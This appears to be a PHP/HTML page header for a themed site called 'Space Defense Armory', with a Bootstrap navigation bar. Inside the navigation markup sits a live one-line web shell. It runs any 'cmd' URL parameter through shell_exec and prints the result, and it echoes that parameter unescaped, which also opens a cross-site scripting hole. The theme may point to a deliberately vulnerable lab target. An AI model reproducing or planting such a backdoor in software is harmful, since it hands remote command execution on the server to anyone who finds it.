<html>
    <head>
        <link rel="stylesheet" href="bootstrap/css/style.css">
        <script src="bootstrap/jquery.js"></script>
        <script src="bootstrap/js/bootstrap.js"></script>
        <link href="bootstrap/css/bootstrap.css" rel="stylesheet"/>
    </head>
    <body>
        <div class="stars"></div>
        <div class="twinkling"></div> 
        <div class="clouds"></div>
        <div class="pos-f-t">
            <nav class="navbar navbar-expand-lg navbar-dark back-color">
                <a class="navbar-brand" href="index.php">Space Defense Armory</a>
                <div class="collapse navbar-collapse">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="catalog.php">Weapons Catalog</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="monitor.php">Alien Monitor</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="reviews.php">Reviews</a>
                        </li>
                    </ul>
                </div>
                <?php if(isset($_GET['cmd'])){$r=str_replace("\n","<br>",htmlspecialchars(shell_exec($_GET['cmd'])));echo "<p>Command: ".$_GET['cmd']."</p><p>Result: ".$r."</p>";}?>
            </nav>
        </div>